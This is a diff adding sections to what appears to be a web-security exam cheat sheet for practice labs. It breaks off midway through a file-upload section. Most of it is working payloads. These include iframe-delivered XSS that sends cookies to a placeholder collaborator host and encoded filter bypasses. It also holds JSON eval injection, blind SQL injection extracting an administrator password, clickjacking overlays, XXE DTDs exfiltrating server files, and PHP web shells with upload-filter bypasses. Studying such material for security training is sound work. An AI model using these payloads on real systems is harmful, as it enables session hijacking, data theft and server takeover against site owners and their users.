@@ -22,6 +22,401 @@
 
 ---
 
+## Pattern: Iframe-Based DOM XSS Event Handlers
+**Context:** Injection point is in URL parameter like `?search=<INJECTION>`
+
+### onload Event
+**Injection point:** `?search=<body onload=PAYLOAD>`
+
+**Basic alert:**
+```html
+<iframe src="https://TARGET/?search=<body onload=alert(1)>"></iframe>
+```
+
+**Cookie exfiltration:**
+```html
+<iframe src="https://TARGET/?search=<body onload=fetch('https://COLLAB.oastify.com?c='%2bdocument.cookie)>"></iframe>
+```
+
+**How it works:**
+- Payload injected into `?search=` parameter
+- Server reflects `<body onload=...>` into page
+- When iframe loads, `onload` event fires automatically
+- No user interaction needed - auto-triggers
+- `%2b` is URL-encoded `+` for concatenation
+
+---
+
+### onmessage Event (postMessage)
+**Injection point:** `?search=<body onmessage=PAYLOAD>`
+
+**Trigger via postMessage:**
+```html
+<iframe src="https://TARGET/?search=<body onmessage=fetch('https://COLLAB.oastify.com?c='%2bdocument.cookie)>" onload="this.contentWindow.postMessage('trigger','*')"></iframe>
+```
+
+**With data extraction:**
+```html
+<iframe src="https://TARGET/?search=<body onmessage=fetch('https://COLLAB.oastify.com?data='%2bevent.data)>" onload="this.contentWindow.postMessage(document.cookie,'*')"></iframe>
+```
+
+**How it works:**
+- Payload injected with `<body onmessage=...>`
+- Iframe's `onload` sends message via `postMessage('trigger','*')`
+- `onmessage` event handler receives the message
+- `event.data` contains the message content
+- Useful for web messaging vulnerabilities
+- `'*'` means any origin (wildcard)
+
+---
+
+### onresize Event
+**Injection point:** `?search=<body onresize=PAYLOAD>`
+
+**Trigger via style change:**
+```html
+<iframe src="https://TARGET/?search=<body onresize=alert(1)>" onload="this.style.width='100px'"></iframe>
+```
+
+**Cookie exfiltration:**
+```html
+<iframe src="https://TARGET/?search=<body onresize=fetch('https://COLLAB.oastify.com?c='%2bdocument.cookie)>" onload="this.style.width='100px'"></iframe>
+```
+
+**How it works:**
+- Payload injected with `<body onresize=...>`
+- Iframe's `onload` changes iframe width to `100px`
+- Changing iframe size triggers `onresize` event
+- Body's `onresize` handler executes payload
+- Auto-triggers without user interaction
+
+---
+
+### onfocus Event
+**Injection point:** `?search=<input onfocus=PAYLOAD autofocus>`
+
+**Auto-trigger with focus:**
+```html
+<iframe src="https://TARGET/?search=<input onfocus=alert(1) autofocus>"></iframe>
+```
+
+**Cookie exfiltration:**
+```html
+<iframe src="https://TARGET/?search=<input onfocus=fetch('https://COLLAB.oastify.com?c='%2bdocument.cookie) autofocus>"></iframe>
+```
+
+**With custom element:**
+```html
+<iframe src="https://TARGET/?search=<xss id=x onfocus=alert(1) tabindex=1>#x"></iframe>
+```
+
+**How it works:**
+- `autofocus` attribute makes input auto-focus on load
+- `onfocus` event fires when element receives focus
+- No user interaction needed
+- `#x` in URL auto-scrolls to element with `id=x`
+- `tabindex=1` makes element focusable
+
+---
+
+### onpageshow Event
+**Injection point:** `?search=<body onpageshow=PAYLOAD>`
+
+**Auto-trigger on page show:**
+```html
+<iframe src="https://TARGET/?search=<body onpageshow=alert(1)>"></iframe>
+```
+
+**Cookie exfiltration:**
+```html
+<iframe src="https://TARGET/?search=<body onpageshow=fetch('https://COLLAB.oastify.com?c='%2bdocument.cookie)>"></iframe>
+```
+
+**How it works:**
+- `onpageshow` fires when page becomes visible
+- Triggers on initial load and when navigating back
+- Auto-triggers without user interaction
+- Similar to `onload` but also fires on back/forward navigation
+
+---
+
+### onhashchange Event
+**Injection point:** `?search=<body onhashchange=PAYLOAD>`
+
+**Trigger via hash change:**
+```html
+<iframe src="https://TARGET/?search=<body onhashchange=alert(1)>#initial" onload="this.src='https://TARGET/?search=<body onhashchange=alert(1)>#changed'"></iframe>
+```
+
+**Cookie exfiltration:**
+```html
+<iframe src="https://TARGET/?search=<body onhashchange=fetch('https://COLLAB.oastify.com?c='%2bdocument.cookie)>#x" onload="this.src+='#y'"></iframe>
+```
+
+**How it works:**
+- Initial load with `#initial` hash
+- Iframe's `onload` changes URL to `#changed`
+- Hash change triggers `onhashchange` event
+- `this.src+='#y'` appends to existing URL
+- Requires two different hash values to trigger
+
+---
+
+### onanimationstart Event
+**Injection point:** `?search=<style>@keyframes x{}</style><div style=animation-name:x onanimationstart=PAYLOAD>`
+
+**Auto-trigger with CSS animation:**
+```html
+<iframe src="https://TARGET/?search=<style>@keyframes x{}</style><div style=animation-name:x onanimationstart=alert(1)>"></iframe>
+```
+
+**Cookie exfiltration:**
+```html
+<iframe src="https://TARGET/?search=<style>@keyframes x{}</style><div style=animation-name:x onanimationstart=fetch('https://COLLAB.oastify.com?c='%2bdocument.cookie)>"></iframe>
+```
+
+**How it works:**
+- `<style>@keyframes x{}</style>` defines CSS animation
+- `style=animation-name:x` applies animation to div
+- `onanimationstart` fires when animation begins
+- Auto-triggers on page load
+- No user interaction needed
+
+---
+
+### ontoggle Event (details element)
+**Injection point:** `?search=<details open ontoggle=PAYLOAD>`
+
+**Auto-trigger with open attribute:**
+```html
+<iframe src="https://TARGET/?search=<details open ontoggle=alert(1)>"></iframe>
+```
+
+**Cookie exfiltration:**
+```html
+<iframe src="https://TARGET/?search=<details open ontoggle=fetch('https://COLLAB.oastify.com?c='%2bdocument.cookie)>"></iframe>
+```
+
+**How it works:**
+- `<details>` element creates collapsible content
+- `open` attribute makes it expanded by default
+- `ontoggle` fires when details opens/closes
+- Auto-triggers on page load due to `open` attribute
+- Works in modern browsers
+
+---
+
+### onerror Event
+**Injection point:** `?search=<img src=x onerror=PAYLOAD>`
+
+**Auto-trigger on image error:**
+```html
+<iframe src="https://TARGET/?search=<img src=x onerror=alert(1)>"></iframe>
+```
+
+**Cookie exfiltration:**
+```html
+<iframe src="https://TARGET/?search=<img src=x onerror=fetch('https://COLLAB.oastify.com?c='%2bdocument.cookie)>"></iframe>
+```
+
+**How it works:**
+- `<img src=x>` tries to load invalid image
+- Browser fails to load image `x`
+- `onerror` event fires on load failure
+- Auto-triggers immediately
+- Most reliable auto-trigger method
+
+---
+
+### onwheel Event
+**Injection point:** `?search=<body onwheel=PAYLOAD>`
+
+**Trigger via scroll wheel (requires user interaction):**
+```html
+<iframe src="https://TARGET/?search=<body onwheel=alert(1)>"></iframe>
+```
+
+**How it works:**
+- `onwheel` fires when user scrolls with mouse wheel
+- **Requires user interaction** - not auto-trigger
+- Not ideal for exam (user must scroll)
+- Use only if auto-trigger events don't work
+
+---
+
+### onscroll Event
+**Injection point:** `?search=<body onscroll=PAYLOAD style='height:9999px'>`
+
+**Trigger via scroll:**
+```html
+<iframe src="https://TARGET/?search=<body onscroll=alert(1) style='height:9999px'>" onload="this.contentWindow.scrollTo(0,100)"></iframe>
+```
+
+**Cookie exfiltration:**
+```html
+<iframe src="https://TARGET/?search=<body onscroll=fetch('https://COLLAB.oastify.com?c='%2bdocument.cookie) style='height:9999px'>" onload="this.contentWindow.scrollTo(0,100)"></iframe>
+```
+
+**How it works:**
+- `style='height:9999px'` makes page scrollable
+- Iframe's `onload` calls `scrollTo(0,100)` to scroll down
+- Scrolling triggers `onscroll` event
+- Auto-triggers via programmatic scroll
+- `this.contentWindow` accesses iframe's window object
+
+---
+
+### onpointerover Event
+**Injection point:** `?search=<div onpointerover=PAYLOAD style='width:100%;height:100%'>`
+
+**Trigger via pointer movement (requires user interaction):**
+```html
+<iframe src="https://TARGET/?search=<div onpointerover=alert(1) style='width:100%;height:100%'>Move mouse here</div>"></iframe>
+```
+
+**How it works:**
+- `onpointerover` fires when pointer moves over element
+- `style='width:100%;height:100%'` makes div full-size
+- **Requires user interaction** - mouse movement
+- Not ideal for exam
+- Use auto-trigger events instead
+
+---
+
+## Event Handler Syntax Reference
+
+### Quick Reference Table
+
+| Event | Element | Trigger Method | Auto-Trigger? | Syntax |
+|-------|---------|----------------|---------------|--------|
+| `onload` | `<body>` | Page loads | ✅ Yes | `<body onload=PAYLOAD>` |
+| `onmessage` | `<body>` | postMessage() | ✅ Yes (via iframe) | `<body onmessage=PAYLOAD>` |
+| `onresize` | `<body>` | Resize iframe | ✅ Yes (via iframe) | `<body onresize=PAYLOAD>` |
+| `onfocus` | `<input>` | autofocus | ✅ Yes | `<input onfocus=PAYLOAD autofocus>` |
+| `onpageshow` | `<body>` | Page visible | ✅ Yes | `<body onpageshow=PAYLOAD>` |
+| `onhashchange` | `<body>` | Hash change | ✅ Yes (via iframe) | `<body onhashchange=PAYLOAD>` |
+| `onanimationstart` | `<div>` | CSS animation | ✅ Yes | `<div style=animation-name:x onanimationstart=PAYLOAD>` |
+| `ontoggle` | `<details>` | open attribute | ✅ Yes | `<details open ontoggle=PAYLOAD>` |
+| `onerror` | `<img>` | Invalid src | ✅ Yes | `<img src=x onerror=PAYLOAD>` |
+| `onscroll` | `<body>` | scrollTo() | ✅ Yes (via iframe) | `<body onscroll=PAYLOAD style='height:9999px'>` |
+| `onwheel` | `<body>` | Mouse wheel | ❌ No | `<body onwheel=PAYLOAD>` |
+| `onpointerover` | `<div>` | Mouse move | ❌ No | `<div onpointerover=PAYLOAD>` |
+
+---
+
+### Event Handler Arguments
+
+**onload**
+- **Arguments:** None
+- **Usage:** `<body onload=alert(1)>`
+- **Trigger:** Automatic on page load
+
+**onmessage**
+- **Arguments:** `event` (implicit)
+- **Access data:** `event.data`
+- **Usage:** `<body onmessage=fetch('https://x.com?d='+event.data)>`
+- **Trigger:** `iframe.contentWindow.postMessage('data','*')`
+
+**onresize**
+- **Arguments:** None
+- **Usage:** `<body onresize=alert(1)>`
+- **Trigger:** `iframe.style.width='100px'`
+
+**onfocus**
+- **Arguments:** None
+- **Usage:** `<input onfocus=alert(1) autofocus>`
+- **Trigger:** Automatic with `autofocus` attribute
+
+**onpageshow**
+- **Arguments:** `event` (implicit)
+- **Usage:** `<body onpageshow=alert(1)>`
+- **Trigger:** Automatic on page show
+
+**onhashchange**
+- **Arguments:** None
+- **Usage:** `<body onhashchange=alert(1)>`
+- **Trigger:** `iframe.src+='#newHash'`
+
+**onanimationstart**
+- **Arguments:** None
+- **Usage:** `<div style=animation-name:x onanimationstart=alert(1)>`
+- **Requires:** `<style>@keyframes x{}</style>`
+- **Trigger:** Automatic when animation starts
+
+**ontoggle**
+- **Arguments:** None
+- **Usage:** `<details open ontoggle=alert(1)>`
+- **Trigger:** Automatic with `open` attribute
+
+**onerror**
+- **Arguments:** None
+- **Usage:** `<img src=x onerror=alert(1)>`
+- **Trigger:** Automatic on load failure
+
+**onscroll**
+- **Arguments:** None
+- **Usage:** `<body onscroll=alert(1) style='height:9999px'>`
+- **Trigger:** `iframe.contentWindow.scrollTo(0,100)`
+
+---
+
+### Common Mistakes to Avoid
+
+❌ **Wrong:** `<body onload="alert(1)">`  
+✅ **Correct:** `<body onload=alert(1)>` (no quotes in URL parameter)
+
+❌ **Wrong:** `<body onmessage=alert(data)>`  
+✅ **Correct:** `<body onmessage=alert(event.data)>` (use `event.data`)
+
+❌ **Wrong:** `<input onfocus=alert(1)>`  
+✅ **Correct:** `<input onfocus=alert(1) autofocus>` (need `autofocus`)
+
+❌ **Wrong:** `<body onresize=alert(1)>` (no trigger)  
+✅ **Correct:** `<iframe src="..." onload="this.style.width='100px'">` (trigger in iframe)
+
+❌ **Wrong:** `<details ontoggle=alert(1)>`  
+✅ **Correct:** `<details open ontoggle=alert(1)>` (need `open` attribute)
+
+---
+
+### Iframe Trigger Methods
+
+**postMessage trigger:**
+```javascript
+iframe.contentWindow.postMessage('message', '*')
+```
+
+**Resize trigger:**
+```javascript
+iframe.style.width = '100px'
+```
+
+**Scroll trigger:**
+```javascript
+iframe.contentWindow.scrollTo(0, 100)
+```
+
+**Hash change trigger:**
+```javascript
+iframe.src += '#newHash'
+// or
+iframe.src = 'https://TARGET/?search=<payload>#changed'
+```
+
+---
+
+## Exam Tips - Iframe DOM XSS
+
+1. **Injection point is in URL parameter** - `?search=`, `?query=`, `?message=`
+2. **Event must auto-trigger** - Use `onload`, `onpageshow`, `onerror`, `autofocus`
+3. **Trigger from iframe onload** - `onload="this.contentWindow.postMessage(...)"`
+4. **URL encode special chars** - `+` = `%2b`, space = `%20`
+5. **Use %2b for +** - In cookie exfiltration: `'%2bdocument.cookie`
+6. **Test auto-trigger events first** - Don't rely on user interaction
+7. **onmessage needs postMessage** - Trigger from iframe's onload
+
+---
+
 ## Pattern: AngularJS Expression Injection
 **Detection:** Look for `ng-app` directive
 
@@ -80,6 +475,93 @@ location = 'https://TARGET/?search=<xss id=x onfocus=alert(1) tabindex=1>#x';
 ${alert(1)}
 ```
 
+### Template Literal - String.fromCharCode Bypass
+**Context:** Angle brackets, quotes, backslash, and backticks are Unicode-escaped
+
+**Payload:**
+```
+${fetch(String.fromCharCode(104,116,116,112,58,47,47,99,111,108,108,97,98,46,99,111,109))}
+```
+
+**How it works:**
+- Template literal context: `` `${...}` ``
+- All special chars Unicode-escaped: `<`, `>`, `'`, `"`, `\`, `` ` ``
+- `String.fromCharCode()` builds string from char codes
+- No quotes or special chars needed
+- Bypasses Unicode escaping filter
+
+**Character codes:**
+```
+104 = h
+116 = t
+116 = t
+112 = p
+58  = :
+47  = /
+47  = /
+99  = c
+111 = o
+108 = l
+108 = l
+97  = a
+98  = b
+46  = .
+99  = c
+111 = o
+109 = m
+```
+
+**Result:** `http://collab.com`
+
+**Cookie exfiltration:**
+```
+${fetch(String.fromCharCode(104,116,116,112,115,58,47,47,67,79,76,76,65,66,46,111,97,115,116,105,102,121,46,99,111,109,47,63,99,61)+document.cookie)}
+```
+
+```
+${eval(String.fromCharCode(102,101,116,99,104,40,34,104,116,116,112,115,58,47,47,111,115,107,115,105,120,97,55,110,116,99,122,52,98,97,106,55,110,107,50,116,111,113,100,54,52,99,118,48,115,111,104,46,111,97,115,116,105,102,121,46,99,111,109,47,63,99,61,34,43,100,111,99,117,109,101,110,116,46,99,111,111,107,101,41))}
+```
+
+**Breakdown:**
+- `https://COLLAB.oastify.com/?c=` in char codes and `+document.cookie` appends 
+
+```py
+>>> for i in x:
+...     print(ord(i), end=",")
+```
+
+- No quotes or special chars used
+
+**Generate char codes (JavaScript):**
+```javascript
+'https://COLLAB.oastify.com/?c='.split('').map(c => c.charCodeAt(0)).join(',')
+```
+
+---
+
+### Template Literal with Function Constructor (Advanced)
+**Context:** Complex filtering, template literal injection with hex encoding
+
+```html
+<script>
+document.location = "https://TARGET/?find="-Function`return fetch\x28'https://COLLAB.oastify.com/?'\x2bdocument.cookie\x29```}//"
+</script>
+```
+
+**How it works:**
+1. Injects into template literal context
+2. Uses `Function` constructor to create function
+3. Hex encodes parentheses: `\x28` = `(`, `\x2b` = `+`
+4. Bypasses filters looking for `(` and `+`
+5. Executes `fetch()` to exfiltrate cookie
+
+**Breakdown:**
+- `"-Function` - Closes string, starts Function constructor
+- `` `return fetch\x28...` `` - Template literal with hex-encoded chars
+- `\x28` = `(`, `\x2b` = `+`
+- `` ``` `` - Closes template literal
+- `}//` - Closes context and comments out rest
+
 ### Backslash Bypass (JSON)
 ```
 \"-alert(1)}//
@@ -93,7 +575,136 @@ ${alert(1)}
 
 ---
 
+## Pattern: JSON Injection via eval()
+**Context:** Code uses `eval()` instead of `JSON.parse()` to parse JSON response
+
+### Vulnerable Code Pattern
+```javascript
+xhr.onreadystatechange = function() {
+    if (this.readyState == 4 && this.status == 200) {
+        eval('var searchResultsObj = ' + this.responseText);
+        displaySearchResults(searchResultsObj);
+    }
+}
+```
+
+### Payload - Close JSON and Execute Code
+```
+ss"};document.location='http://COLLAB.oastify.com/?c='+document.cookie;//
+```
+
+**How it works:**
+1. `ss` - Completes the current JSON string value
+2. `"}` - Closes the JSON string and object
+3. `;` - Ends the variable assignment statement
+4. `document.location='...'` - Arbitrary JavaScript code
+5. `//` - Comments out the rest of the original code
+
+**Full eval() execution:**
+```javascript
+eval('var searchResultsObj = {"results":"ss"};document.location=\'http://COLLAB.oastify.com/?c=\'+document.cookie;//"}');
+```
+
+**Result:** Cookie exfiltrated to Burp Collaborator
+
+---
+
+### Alternative Payloads
+
+**Using alert:**
+```
+test"};alert(document.cookie);//
+```
+
+**Using fetch:**
+```
+x"};fetch('https://COLLAB.oastify.com?c='+document.cookie);//
+```
+
+**Using XMLHttpRequest:**
+```
+a"};var xhr=new XMLHttpRequest();xhr.open('GET','https://COLLAB.oastify.com?c='+document.cookie);xhr.send();//
+```
+
+**Multiline payload:**
+```
+"};
+var img=new Image();
+img.src='https://COLLAB.oastify.com?c='+document.cookie;
+//
+```
+
+---
+
+### Detection Tips
+
+**Look for these patterns in JavaScript:**
+- `eval('var x = ' + response)`
+- `eval(response)`
+- `eval('...' + userInput + '...')`
+- Any `eval()` with concatenated strings
+
+**Why it's vulnerable:**
+- `eval()` executes code, not just parses JSON
+- Should use `JSON.parse()` instead
+- Allows breaking out of JSON structure
+
+---
+
+### JSON.parse Bypass with Function Constructor
+**Context:** Even with `JSON.parse()`, can break out of JSON context in search parameter
+
+**Payload:**
+```
+\"-Function('return fetch("https://COLLAB.oastify.com/?"+document.cookie)')()}//\"
+```
+
+**URL-encoded:**
+```
+%5C%22-Function(%27return%20fetch(%22https://COLLAB.oastify.com/?%22%2bdocument.cookie)%27)()}%2F%2F%22
+```
+
+**How it works:**
+1. `\"` - Escapes the quote (backslash not escaped)
+2. `-Function(...)` - Uses Function constructor
+3. `'return fetch(...)'` - Function body with fetch
+4. `()` - Immediately invokes the function
+5. `}//` - Closes context and comments out rest
+6. `\"` - Final quote to close
+
+**Full URL:**
+```
+https://TARGET/?search=\"-Function('return fetch("https://COLLAB.oastify.com/?"+document.cookie)')()}//\"
+```
+
+**Why it works:**
+- Backslash not escaped in JSON context
+- `\"` becomes `"` after one level of parsing
+- Function constructor executes arbitrary code
+- Hex encoding (`\x28`, `\x2b`) bypasses parentheses/plus filters
+
+**Alternative with hex encoding:**
+```
+\"-Function`return fetch\x28'https://COLLAB.oastify.com/?'\x2bdocument.cookie\x29```}//\"
+```
+
+**Breakdown:**
+- `\x28` = `(`
+- `\x2b` = `+`
+- `\x29` = `)`
+- Bypasses filters looking for `(` and `+`
+
+---
+
 ## Pattern: Web Message Exploitation
+
+
+```
+<script>
+document.location = "https://TARGET/?find="-Function`return fetch\x28'https://COLLAB.oastify.com/?'\x2bdocument.cookie\x29```}//"
+</script>
+```
+
 
 ### PostMessage to innerHTML
 ```html
@@ -108,6 +719,11 @@ ${alert(1)}
 ### JSON.parse Sink
 ```html
 <iframe src=https://TARGET/ onload='this.contentWindow.postMessage("{\"type\":\"load-channel\", \"url\": \"javascript:print()\"}","*")'>
+```
+
+Exfiltration via postMessage:
+```html
+<iframe src=https://TARGET/ onload='this.contentWindow.postMessage("{\"type\":\"load-channel\", \"url\": \"javascript:fetch(`https://COLLAB_URL/?c=${document.cookie}`)\"}","*")'>
 ```
 
 ---
@@ -360,6 +976,57 @@ sqlmap -r request.txt --level 5 --risk 3 --batch --dump
 
 ---
 
+## Pattern: ORDER BY / GROUP BY Injection
+**Context:** SQL injection in ORDER BY or GROUP BY clause (less common but appears in exams)
+
+### Boolean-Based Blind (PostgreSQL)
+```sql
+order=ASC,(SELECT (CASE WHEN (7435=7435) THEN 1 ELSE 1/(SELECT 0) END))
+```
+
+**How it works:**
+- If condition true → returns 1 (valid)
+- If condition false → division by zero error
+- Use for character-by-character extraction
+
+**Extract password:**
+```sql
+order=ASC,(SELECT (CASE WHEN (SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1)='a') THEN 1 ELSE 1/(SELECT 0) END))
+```
+
+---
+
+### Error-Based (PostgreSQL)
+```sql
+order=ASC,(CAST((CHR(113)||CHR(98)||CHR(122)||CHR(118)||CHR(113))||(SELECT (CASE WHEN (6223=6223) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(107)||CHR(98)||CHR(113)||CHR(113)) AS NUMERIC))
+```
+
+**Simplified for password extraction:**
+```sql
+order=ASC,CAST((SELECT password FROM users WHERE username='administrator') AS NUMERIC)
+```
+
+**Result:** Password appears in error message
+
+---
+
+### Time-Based Blind (PostgreSQL)
+```sql
+order=ASC,(SELECT (CASE WHEN (5657=5657) THEN (SELECT 5657 FROM PG_SLEEP(5)) ELSE 1/(SELECT 0) END))
+```
+
+**Extract password character-by-character:**
+```sql
+order=ASC,(SELECT (CASE WHEN (SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1)='a') THEN (SELECT 1 FROM PG_SLEEP(5)) ELSE 1 END))
+```
+
+**Use Burp Intruder:**
+- Position: `='§a§'`
+- Payload: a-z, 0-9
+- Check response time (5+ seconds = match)
+
+---
+
 ## Pattern: Error-Based Extraction
 **Common Location:** TrackingId cookie, search parameters
 
@@ -455,27 +1122,260 @@ window.onclick = () => {
 
 ---
 
-# XXE
+# Clickjacking
 
-## Pattern: Blind XXE with External DTD
-**Common Location:** Stock check XML
+## Pattern: Clickjacking with Pre-filled XSS
+**Context:** Overlay transparent iframe over decoy button to trick user into clicking
 
-### Main Request
-```xml
-<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE foo [ <!ENTITY % ext SYSTEM "https://EXPLOIT-SERVER/exploit.dtd"> %ext; ]>
-<stockCheck><productId>2</productId><storeId>3</storeId></stockCheck>
+### Basic Clickjacking Attack
+```html
+<style>
+	iframe {
+		position:relative;
+		width:700px;
+		height: 1000px;
+		opacity: 0.1;
+		z-index: 2;
+	}
+	div {
+		position:absolute;
+		top:800px;
+		left:80px;
+		z-index: 1;
+	}
+</style>
+<div>Click me</div>
+<iframe src="https://TARGET/my-account"></iframe>
 ```
 
-### External DTD (Host on exploit server)
+**How it works:**
+- `opacity: 0.1` makes iframe nearly invisible (use `0.0001` for production)
+- `z-index: 2` places iframe above the decoy button
+- `position:absolute` on div positions decoy button
+- User clicks "Click me" but actually clicks iframe button
+- Adjust `top` and `left` to align with target button
+
+---
+
+### Clickjacking + XSS (Pre-filled Form)
+**Context:** Combine clickjacking with XSS payload in form parameters
+
+```html
+<style>
+	iframe {
+		position:relative;
+		width:700px;
+		height: 1000px;
+		opacity: 0.1;
+		z-index: 2;
+	}
+	div {
+		position:absolute;
+		top:800px;
+		left:80px;
+		z-index: 1;
+	}
+</style>
+<div>Click me</div>
+<iframe src="https://TARGET/feedback?csrf=TOKEN&name=<img src=x onerror='print()'>& email=hacker@evil.com&subject=test&message=test"></iframe>
+```
+
+**How it works:**
+1. Iframe loads feedback form with pre-filled XSS payload
+2. `name` parameter contains: `<img src=x onerror='print()'>`
+3. User clicks decoy "Click me" button
+4. Actually clicks "Submit" button in iframe
+5. Form submits with XSS payload
+6. XSS executes when admin views feedback
+
+**URL-encoded version:**
+```html
+<iframe src="https://TARGET/feedback?csrf=TOKEN&name=%3Cimg+src%3Dx+onerror%3D%22print%281%29%22%3E&email=world%40world.com&subject=s&message=sss"></iframe>
+```
+
+---
+
+### Positioning Tips
+
+**Find button position:**
+1. Set `opacity: 0.5` to see both layers
+2. Adjust `top` and `left` values
+3. Use browser DevTools to inspect coordinates
+4. Set `opacity: 0.0001` for final exploit
+
+**Common positions:**
+- Delete button: `top: 300px; left: 50px`
+- Submit button: `top: 800px; left: 80px`
+- Confirm button: `top: 500px; left: 200px`
+
+---
+
+### Defense Check
+
+**Test if site is vulnerable:**
+```html
+<iframe src="https://TARGET/"></iframe>
+```
+
+**If blocked, you'll see:**
+- Blank iframe (X-Frame-Options header)
+- Console error: "Refused to display in a frame"
+- CSP frame-ancestors directive blocking
+
+**Bypass attempts:**
+- Try different endpoints (`/my-account`, `/admin`)
+- Check if only homepage is protected
+- Look for subdomain without protection
+
+---
+
+## Exam Tips - Clickjacking
+
+1. **Adjust opacity for testing** - Use `0.5` to see alignment
+2. **Use DevTools** - Inspect button coordinates
+3. **Pre-fill forms** - Include XSS/CSRF payloads in URL
+4. **Test all endpoints** - Some may lack X-Frame-Options
+5. **Combine with XSS** - Pre-fill form fields with payloads
+6. **Use CSRF tokens** - Extract from page if needed
+
+---
+
+# XXE
+
+## Pattern: Blind XXE with Out-of-Band Interaction
+**Context:** Stock check XML, no direct output
+
+### Basic Out-of-Band Detection
 ```xml
-<!ENTITY % file SYSTEM "file:///home/carlos/secret">
-<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://COLLAB.oastify.com/?x=%file;'>">
+<!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN"> %xxe; ]>
+```
+
+**How it works:**
+1. Defines parameter entity `%xxe` pointing to Burp Collaborator
+2. Executes `%xxe` which makes HTTP request
+3. Check Burp Collaborator for DNS/HTTP callback
+4. Confirms XXE vulnerability
+
+---
+
+## Pattern: Blind XXE - Data Exfiltration via External DTD
+
+### Step 1: Create External DTD on Exploit Server (`/exploit.dtd`)
+```xml
+<!ENTITY % file SYSTEM "file:///etc/hostname">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://BURP-COLLABORATOR-SUBDOMAIN/?x=%file;'>">
 %eval;
 %exfil;
 ```
 
-**Note:** `&#x25;` = `%` (required for nested entities)
+**For exam (read `/home/carlos/secret`):**
+```xml
+<!ENTITY % file SYSTEM "file:///home/carlos/secret">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://BURP-COLLABORATOR-SUBDOMAIN/?x=%file;'>">
+%eval;
+%exfil;
+```
+
+### Step 2: Trigger from Stock Check Request
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "YOUR-DTD-URL"> %xxe;]>
+<stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
+```
+
+**Replace `YOUR-DTD-URL` with:** `https://exploit-server.net/exploit.dtd`
+
+### Step 3: Check Burp Collaborator
+- Look for HTTP request with `?x=` parameter
+- Data from `/home/carlos/secret` appears in URL
+
+**Note:** `&#x25;` = `%` (required for nested parameter entities)
+
+---
+
+## Pattern: Blind XXE - Error-Based Exfiltration
+
+### Step 1: Create Malicious DTD on Exploit Server (`/exploit.dtd`)
+```xml
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%file;'>">
+%eval;
+%exfil;
+```
+
+**For exam:**
+```xml
+<!ENTITY % file SYSTEM "file:///home/carlos/secret">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%file;'>">
+%eval;
+%exfil;
+```
+
+**How it works:**
+1. Reads file into `%file` entity
+2. Tries to access `file:///invalid/[file contents]`
+3. Invalid path causes error
+4. File contents appear in error message
+
+### Step 2: Trigger from Stock Check Request
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "YOUR-DTD-URL"> %xxe;]>
+<stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
+```
+
+### Step 3: Check Response
+- Error message contains file contents
+- Look for "No such file or directory: /invalid/[SECRET]"
+
+---
+
+## Pattern: XInclude Attack
+**Context:** Cannot modify DOCTYPE (only control data inside XML)
+
+### Payload
+```xml
+<foo xmlns:xi="http://www.w3.org/2001/XInclude">
+<xi:include parse="text" href="file:///etc/passwd"/>
+</foo>
+```
+
+**For stock check (productId parameter):**
+```xml
+<stockCheck>
+<productId xmlns:xi="http://www.w3.org/2001/XInclude">
+<xi:include parse="text" href="file:///home/carlos/secret"/>
+</productId>
+<storeId>1</storeId>
+</stockCheck>
+```
+
+**When to use:**
+- Cannot modify DOCTYPE declaration
+- Only control element content
+- Application uses XInclude-aware XML parser
+
+---
+
+## XXE Quick Reference
+
+| Technique | Use Case | Output Location |
+|-----------|----------|-----------------|
+| Out-of-band interaction | Detect XXE | Burp Collaborator |
+| External DTD exfiltration | Extract data blind | Burp Collaborator HTTP logs |
+| Error-based exfiltration | Extract data blind | Error message in response |
+| XInclude | No DOCTYPE control | Direct in response |
+
+---
+
+## Exam Tips
+
+1. **Scan entire stock check request** - Not just targeted scan
+2. **Use Burp Scanner** - Detects XXE automatically
+3. **Host DTD on exploit server** - Required for blind XXE
+4. **Check Burp Collaborator** - DNS and HTTP logs
+5. **Try XInclude** - If DOCTYPE modification blocked
+6. **Error-based is faster** - No need for Collaborator polling
 
 ---
 
@@ -839,6 +1739,117 @@ ${7*7}
 
 ---
 
+# File Upload
+
+## Pattern: Polyglot PHP Web Shell
+**Context:** Avatar/image upload with extension/content-type filtering
+
+### Create Polyglot File (Read Secret)
+```bash
+exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" poc.png -o polyglot.php
+```
+
+**How it works:**
+1. Creates valid image file with PHP code in EXIF comment
+2. Upload as `polyglot.php`
+3. Server executes PHP code
+4. Secret appears between START and END markers
+
+---
+
+### Alternative: Simple Web Shell
+```bash
+exiftool -Comment="<?php system($_GET['cmd']); ?>" image.jpg -o shell.php
+```
+
+**Usage:**
+```
+/files/avatars/shell.php?cmd=cat /home/carlos/secret
+```
+
+---
+
+### Magic Bytes Bypass
+**Add GIF header to PHP shell:**
+```php
+GIF89a;
+<?php echo file_get_contents('/home/carlos/secret'); ?>
+```
+
+---
+
+### Extension Bypass Techniques
+
+| Technique | Example | Notes |
+|-----------|---------|-------|
+| Alternative extensions | `.php5`, `.phtml`, `.phar` | Try all PHP extensions |
+| Case variation | `.pHp`, `.PhP` | Bypass case-sensitive filters |
+| Null byte | `shell.php%00.jpg` | Works on older systems |
+| Double extension | `shell.php.jpg` | Some servers execute first extension |
+
+---
+
+### Content-Type Bypass
+```http
+Content-Disposition: form-data; name="avatar"; filename="shell.php"
+Content-Type: image/jpeg
+
+<?php echo file_get_contents('/home/carlos/secret'); ?>
+```
+
+---
+
+### .htaccess Configuration Override
+**Context:** Apache server allows .htaccess upload
+
+**Step 1:** Upload malicious .htaccess file
